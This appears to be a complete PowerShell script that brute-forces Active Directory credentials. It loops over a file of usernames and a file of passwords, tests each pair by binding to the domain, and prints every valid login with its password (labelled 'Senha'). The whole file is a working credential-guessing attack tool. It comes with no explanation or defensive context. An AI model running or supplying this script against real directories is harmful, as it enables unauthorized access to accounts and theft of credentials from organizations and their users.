Function Test-ADAuthentication {
    param($userlogin,$userpassword)
    (new-object directoryservices.directoryentry "",$userlogin,$userpassword).psbase.name -ne $null
}
$usernames = Get-Content c:\temp\users2.txt
foreach($username in $usernames){
    $login = $username
    $passwords = Get-Content c:\temp\passwords.txt
    foreach($password in $passwords){

        if (Test-ADAuthentication $login $password)
        {
            Write-Host "Login: " $login 
            Write-Host "`t`t Senha: " $password -ForegroundColor Green 
            break
        }
    }
} 